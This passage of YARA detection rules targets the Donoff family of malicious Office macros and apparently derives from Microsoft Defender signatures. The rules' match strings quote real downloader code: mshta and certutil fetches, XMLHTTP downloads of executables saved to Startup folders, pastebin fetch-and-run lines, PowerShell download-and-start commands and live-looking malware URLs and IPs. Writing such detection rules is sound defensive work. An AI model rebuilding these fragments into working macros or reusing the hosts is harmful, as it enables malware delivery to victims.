        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PDA_2147811401_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PDA!MTB"
        threat_id = "2147811401"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MsgBox \"Erro! Office 365 no installed." ascii //weight: 1
        $x_1_2 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "fso.copyfile \"C:\\Windows\\System32\\mshta.exe\", Environ(\"PUBLIC\") & \"\\calc.com\", True" ascii //weight: 1
        $x_1_4 = "= Shell(\"C:\\Users\\Public\\calc.com \"\"https://unimed-corporated.com/brasil/CPAhtml.mp3\"\"\")" ascii //weight: 1
        $x_1_5 = "= Shell(\"C:\\Users\\Public\\calc.com \"\"https://unimed-corporated.com/brasil/CPAInjectTarefa.mp3\"\"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PDB_2147811700_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PDB!MTB"
        threat_id = "2147811700"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"https://pastebin.com/raw/vmfavtlu\"))adiag.savetofile\"bfvby.vbs\",2'savebinarydatatodiskcreateobject(\"wscript.shell\").run\"bfvby.vbs\",0,falsesetadiag=nothingendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PDB_2147811700_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PDB!MTB"
        threat_id = "2147811700"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Debug.Print MsgBox(\"ERROR!\", vbOKCancel); returns; 1" ascii //weight: 1
        $x_1_2 = "obj.Uganda" ascii //weight: 1
        $x_1_3 = "manpowerhorse = salu1 + salu2 + salu3 + salu4" ascii //weight: 1
        $x_1_4 = "salubhai = manpowerhorse" ascii //weight: 1
        $x_1_5 = "Debug.Assert (Shell(salubhai))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QSM_2147811893_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QSM!MTB"
        threat_id = "2147811893"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell(\"C:\\Users\\Public\\calc.com \"\"http://documents.pro.br/injction.mp3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_KAH_2147813400_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.KAH!MTB"
        threat_id = "2147813400"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.rhb-international.com/projects/enquiry.zip\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"WScript.Shell\").SpecialFolders(\"MyDocuments\") & \"\\enquiry.zip\"" ascii //weight: 1
        $x_1_3 = "= pathname & \"\\\" & \"enquiry.zip\"" ascii //weight: 1
        $x_1_4 = "'Shell \"RunDLL32.exe C:\\Windows\\System32\\Shimgvw.dll,ImageView_Fullscreen \" & pathname" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PRC_2147814483_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PRC!MTB"
        threat_id = "2147814483"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "pastebin.com/raw/182EQMpi" ascii //weight: 1
        $x_1_2 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = {52 75 6e 20 22 [0-10] 2e 76 62 73 22}  //weight: 1, accuracy: Low
        $x_1_4 = {46 69 6c 65 43 6f 70 79 20 22 [0-10] 2e 76 62 73 22 2c 20 45 6e 76 69 72 6f 6e 24 28 22 61 70 70 64 61 74 61 22 29 20 26 20 22 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STE_2147816731_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STE!MTB"
        threat_id = "2147816731"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 49 44 20 3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 32 30 2e 34 30 2e 39 37 2e 39 34 2f 69 74 6c 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-21] 2e 62 61 74 22 22 20 [0-22] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RVA_2147816733_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RVA!MTB"
        threat_id = "2147816733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open(\"C:\\Users\\Public\\Documents\\temp.doc\")" ascii //weight: 1
        $x_1_2 = "objHttp.Open \"GET\", strUrl, False" ascii //weight: 1
        $x_1_3 = "strUrl & Chr(47) & \"ord03\" & Chr(47) & strSrcFileName" ascii //weight: 1
        $x_1_4 = "AscB(MidB(objHttp.ResponseBody, i + 1, 1))" ascii //weight: 1
        $x_1_5 = "Err = 4198 Then MsgBox \"Document was not closed\"" ascii //weight: 1
        $x_1_6 = "Document_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_OBSM_2147818252_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.OBSM!MTB"
        threat_id = "2147818252"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "%appdata%\")&\"\\microsoft\\windows\\startmenu\\programs\\startup\\updatesyncing.bat\",2,true)" ascii //weight: 1
        $x_1_2 = "cmd=\"cmd/cstart/b/min\"&\"c:\\wind\"&\"ows\\micr\"&\"osoft.net\\framew\"&\"ork64\\v4.0.3\"&\"0319\\msbu\"&\"ild.exe\"&\"/nol\"&\"ogo/nocons\"&\"olelogger\"&strresult" ascii //weight: 1
        $x_1_3 = "sbmb=\"4c8bdc49895b08\"" ascii //weight: 1
        $x_1_4 = "ssmb=\"4883ec384533db\"" ascii //weight: 1
        $x_1_5 = "sbmb=\"8b450c85c0745a85db\"" ascii //weight: 1
        $x_1_6 = "ssmb=\"8b550c85d27434837d\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_OCSM_2147819473_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.OCSM!MTB"
        threat_id = "2147819473"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "meinmadarchoodhun5nooo_Proce66" ascii //weight: 1
        $x_1_2 = "C:\\Users\\Public\\Documents\\motor.js\")" ascii //weight: 1
        $x_1_3 = "mshta https://bitbucket.org/!api/2.0/snippets/rikimartinplace/6E6j9y/9710bb98a0cc01972dc0f43ae05870f189db6053/files/vsionthegreat\"\";kamiaba.Run(bhothogya,0);\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RPDO_2147819863_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RPDO!MTB"
        threat_id = "2147819863"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 72 65 61 74 65 6f 62 6a 65 63 74 28 [0-10] 29 73 65 74 [0-15] 3d [0-15] 2e 6f 70 65 6e 74 65 78 74 66 69 6c 65 28 [0-15] 2b 22 5c 72 66 65 63 6e 2e 76 62 73 22 2c 38 2c 74 72 75 65 29 01 2e 77 72 69 74 65 6c 69 6e 65 66 01 2e 63 6c 6f 73 65 00 02 63 72 65 61 74 65 6f 62 6a 65 63 74 [0-47] 2e 6f 70 65 6e 28 [0-31] 2b 22 5c 72 66 65 63 6e 2e 76 62 73 22 29 00 01 3d 67 65 74 74 69 63 6b 63 6f 75 6e 74 2b 28 66 69 6e 69 73 68 2a 31 30 30 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AG_2147820236_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AG!MSR"
        threat_id = "2147820236"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_3_1 = ".Open \"GET\", \"http://coremailxt5mainjsp.com/winlogon.exe\"" ascii //weight: 3
        $x_2_2 = ".savetofile Environ(\"APPDATA\") & \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winlogon.pif\", 2" ascii //weight: 2
        $x_2_3 = "Environ(\"APPDATA\") & \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.exe\"" ascii //weight: 2
        $x_1_4 = "= CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AG_2147820236_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AG!MSR"
        threat_id = "2147820236"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Msg = Msg & \"Total Cells: \" & vbTab & Format(NumCells, \"#,###\")" ascii //weight: 1
        $x_1_2 = "(\"knl.2202_TNATROPMI/\")" ascii //weight: 1
        $x_1_3 = ".IconLocation = \"C:\\ProgramData\\Microsoft\\Device Stage\\Task\\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\\folder.ico\"" ascii //weight: 1
        $x_1_4 = "& \"bgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACg" ascii //weight: 1
        $x_1_5 = ".Description = \"Create peace and Enjoy\"" ascii //weight: 1
        $x_1_6 = "(\"tcejbOmetsySeliF.gnitpircS\"))" ascii //weight: 1
        $x_1_7 = "= \"powe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SWS_2147821024_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SWS!MTB"
        threat_id = "2147821024"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://192.210.149.242/mac.txt\"" ascii //weight: 1
        $x_1_2 = "= FVvQdW.Exec(wplmW())" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ODSM_2147821500_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ODSM!MTB"
        threat_id = "2147821500"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "publicfunctioncarinterface_name(byvalnameasstring)" ascii //weight: 1
        $x_1_2 = "openworld=oneday1.tag" ascii //weight: 1
        $x_1_3 = "socialworld=oneday1.openandshut.tag+oneday1.button.tag" ascii //weight: 1
        $x_1_4 = "softcorner=openworld+\"\"+socialworld" ascii //weight: 1
        $x_1_5 = "carinterface_name(softcorner)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STLV_2147822323_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STLV!MTB"
        threat_id = "2147822323"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"http://192.210.149.242/mac.txt\")" ascii //weight: 1
        $x_1_2 = "FVvQdW.Exec(wplmW())" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RPTT_2147824006_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RPTT!MTB"
        threat_id = "2147824006"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 65 74 6f 62 6a 65 63 74 28 22 [0-95] 22 29 2e 65 6e 76 69 72 6f 6e 6d 65 6e 74 28 22 70 72 6f 63 65 73 73 22 29 28 22 7b [0-95] 7d 22 29 3d 22 68 74 74 70 3a 2f 2f 70 72 6f 74 6f 6e 6f 73 6b 6f 2e 68 6f 73 74 2f 78 73 2f 72 6f 76 6a 6d 6d 77 38 65 74 74 70 75 68 66 78 68 72 32 30 33 63 76 77 6d 6e 6e 67 75 79 6b 38 67 71 7e 7e 2f 64 61 74 66 70 68 7a 6b 74 6c 71 73 6b 70 62 6f 31 66 70 74 70 32 62 62 34 36 39 6b 74 6e 70 69 78 61 7e 7e 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STSV_2147824770_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STSV!MTB"
        threat_id = "2147824770"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {27 68 74 74 70 73 3a 2f 2f 69 6d 61 67 69 6e 65 2d 77 6f 72 6c 64 2e 63 6f 6d 2f 27 2b 24 [0-31] 29}  //weight: 1, accuracy: Low
        $x_1_2 = "\"C:\\ProgramData\\prncnfg.txt\"" ascii //weight: 1
        $x_1_3 = "CreateTextFile(temp & \"\\gatherNetworkInfo.v\" & Chr(98) & \"s\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STEW_2147826419_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STEW!MTB"
        threat_id = "2147826419"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CHFh.Navigate (\"http://192.3.76.220/mac.txt\")" ascii //weight: 1
        $x_1_2 = "CreateObject(BItmR())" ascii //weight: 1
        $x_1_3 = "lJdXZG.Exec(DTlWH())" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STGW_2147826825_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STGW!MTB"
        threat_id = "2147826825"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fs.CreateTextFile(\"C:\\Users\\Public\\calc.bat\", True)" ascii //weight: 1
        $x_1_2 = "(StrReverse(\"\"\"lmth.lmth/rb.moc.xtenyks//:sptth\"\" athsm\"))" ascii //weight: 1
        $x_1_3 = "Shell Worksheets(\"CDT\").Range(\"B13\")" ascii //weight: 1
        $x_1_4 = "Shell Worksheets(\"CDT\").Range(\"J193\")" ascii //weight: 1
        $x_1_5 = "Shell Worksheets(\"CDT\").Range(\"D115\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STGY_2147828830_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STGY!MTB"
        threat_id = "2147828830"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateTextFile(sf & \"\\e038ff73.bat\", True)" ascii //weight: 1
        $x_1_2 = "6563686F206F66660A64656C202F712F662F73202574656D70255C65303338666637332E7662730A64656C202F712F662F73202574656D70255C653033386666" ascii //weight: 1
        $x_1_3 = "6874740A5345542070343D703A2F2F31370A5345542070353D382E31382E320A5345542070363D34302E3230370A5345542070373D2F70726976610A53455420" ascii //weight: 1
        $x_1_4 = "70383D74652F636F6D0A5345542070393D70616E795F640A534554207031303D657461696C730A534554207031313D2F6162632E650A534554207031323D7865" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STHW_2147832108_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STHW!MTB"
        threat_id = "2147832108"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xHttp.Open \"Get\", \"http://sheet.duckdns.org:9000/Budget.exe\"," ascii //weight: 1
        $x_1_2 = ".savetofile \"Budget.exe\", 2 '//overwrite" ascii //weight: 1
        $x_1_3 = "objShell.ShellExecute \"Budget.exe\", \"\", \"\", \"runas\", 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STR_2147836708_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STR!MTB"
        threat_id = "2147836708"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Sub HS86S0DEJ()" ascii //weight: 1
        $x_1_2 = "oS034 = iAE30D & \"\\FXSAAENPILogFile.txt\"" ascii //weight: 1
        $x_1_3 = "xc03Z.Open \"GET\", \"http://5645780.c1.biz//index.php?user_id=trap&auth=trap&pw=trap\", False" ascii //weight: 1
        $x_1_4 = "sCmdLine = \"cmd /c expand \" & oS034 & \" -F:* \" & iAE30D & \" && \" & iAE30D & \"\\check.bat\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PFN_2147836850_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PFN!MTB"
        threat_id = "2147836850"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "Shell$ wprocCXmQ, 0" ascii //weight: 1
        $x_1_3 = "Mid(wWFsIYXDEEo, 13, 73)" ascii //weight: 1
        $x_1_4 = "= Array(\"vRAplWAB\", \"cYLiLvZw\", \"zZWYIFUX\", \"iETEhTqH\", \"jKZoDVld\")" ascii //weight: 1
        $x_1_5 = "= \"UkJsWTPzIsV5ni30PzKZ2LdODEPXjFBifiXHkWrJDcEzIEQOCMnvCIlXhYdTBZPLUvNQXlYMujLwpzwqILiBSFcWzzZMtYIdNsdMqArQoaBTwmhiZnLp3b\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_STS_2147836992_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.STS!MTB"
        threat_id = "2147836992"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URLFile = \"http://a0751007.xsph.ru/urEhL95r.exe\"" ascii //weight: 1
        $x_1_2 = "MsgBox \"The document is protected\", vbInformation, \"The document is protected\"" ascii //weight: 1
        $x_1_3 = "MsgBox \"?????? ? \" & Status, vbExclamation, \"??????\"" ascii //weight: 1
        $x_1_4 = "CreateObject(\"wscript.shell\").Run \"\"\"\" & Katalog & \"\\\" & NameFileIn & \"\"\"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_ASM_2147839388_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.ASM!MTB"
        threat_id = "2147839388"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {31 39 38 2e 32 33 2e 31 37 32 2e 39 30 2f [0-31] 2e 65 78 65 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 24 54 65 6d 70 46 69 6c 65 3b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BSM_2147839593_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BSM!MTB"
        threat_id = "2147839593"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {33 2e 36 35 2e 32 2e 31 33 39 2f [0-31] 2e 65 78 65 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 24 54 65 6d 70 46 69 6c 65 3b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DSM_2147839633_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DSM!MTB"
        threat_id = "2147839633"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {31 37 33 2e 32 33 32 2e 31 34 36 2e 37 38 2f [0-47] 2e 65 78 65 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 24 54 65 6d 70 46 69 6c 65 3b}  //weight: 1, accuracy: Low
    condition:
